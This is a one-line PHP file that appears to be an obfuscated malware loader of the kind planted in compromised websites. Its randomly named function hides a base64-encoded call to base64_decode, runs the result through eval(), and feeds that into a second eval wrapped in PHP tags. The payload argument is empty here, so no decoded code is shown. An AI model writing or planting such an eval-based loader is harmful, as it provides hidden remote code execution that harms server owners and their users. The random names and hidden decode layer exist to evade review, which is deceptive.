<?php function WwrsmFfqLhNgvnYimJig($GEhzAciNHl){$r=base64_decode("YmFzZTY0X2RlY29kZSgkR0VoekFjaU5IbCk=");return eval("return $r;");} eval('?>'.WwrsmFfqLhNgvnYimJig('').'<?php '); ?>